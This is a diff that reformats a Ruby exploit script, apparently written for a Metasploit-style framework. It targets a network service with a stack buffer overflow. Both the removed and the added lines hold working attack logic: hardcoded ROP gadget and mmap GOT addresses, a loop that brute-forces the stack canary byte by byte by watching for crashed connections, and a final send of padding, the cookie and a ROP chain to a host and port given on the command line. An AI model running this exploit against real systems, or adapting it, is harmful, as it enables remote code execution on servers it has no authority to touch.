@@ -10,8 +10,8 @@ poprsi = 0x0043a00e
 poprdx = 0x0041b8fa 
 poprax = 0x00442c80 
 
-mmap64 = 0x4029b0
-mmapgot = 0x67f290
+mmap64   = 0x4029b0
+mmapgot  = 0x67f290
 mmapaddr = 0x00410000
 
 rsito_rax_ = 0x0042afcb
@@ -72,53 +72,56 @@ $chunk = "f"*(1024-$payload.length-8) + "0f0f0f0f"
 $payload << $chunk
 
 def crash(cookie, cookie_test=true)
-    data = ""
-    5.times {
-        payload = $payload + ""
-        tcp_connect(ARGV[0],ARGV[1].to_i) { |s|
-            $count+=1
-            payload << ["A"*(4096+8), cookie].join
-            payload << ["C"*24, $ropchain].join if not cookie_test
+  data = ''
+  5.times do
+    payload = $payload
+    tcp_connect(ARGV[0],ARGV[1].to_i) do |s|
+      $count += 1
+      payload << ["A"*(4096+8), cookie].join
+      payload << ["C"*24, $ropchain].join if not cookie_test
 
-            s.send(payload,0)
-            
-            data = s.recv(10)
-            s.close
-            return true if data.strip.length == 0
-        }
-    }
-    return false
+      s.send(payload,0)
+
+      data = s.recv(10)
+      s.close
+      return true if data.strip.length == 0
+    end
+  end
+
+  return false
 end
 
 s = [0]
 if ARGV.length < 3
-    # test cookie
-    while s.length < 8 do
-        print_info "searching for byte: #{s.length}"
-        for c in 1..255
-            print "\r#{c}"
-            s1 = s + [c]
-            if not crash(s1.pack("C*"))
-                s << c
-                puts
-                break
-            end
-        end
+  # test cookie
+  while s.length < 8
+    print_info "searching for byte: #{s.length}"
+    (1..255).each do |c|
+      print "\r#{c}"
+      s1 = s + [c]
+
+      unless crash(s1.pack("C*"))
+        s << c
+        puts
+        break
+      end
     end
-    s = s.pack("c*")
+  end
+  s = s.pack("c*")
 else
-    # try it ?
-    s = (ARGV[2]).gsub("\\x","").hex_decode
-    if crash(s)
-        print_error "Wrong cookie"
-        exit
-    end
+  # try it ?
+  s = (ARGV[2]).gsub("\\x","").hex_decode
+
+  if crash(s)
+    print_error "Wrong cookie"
+    exit
+  end
 end
 
 print_info "Found cookie: #{s.hex_escape} #{s.length}"
 
 print_info "PRESS ENTER TO GIVE THE SHIT TO THE HOLE AT #{ip} #{port}"
-$stdin.gets 
+gets 
 
 crash(s,false)
 print_info "#{$count} connections"
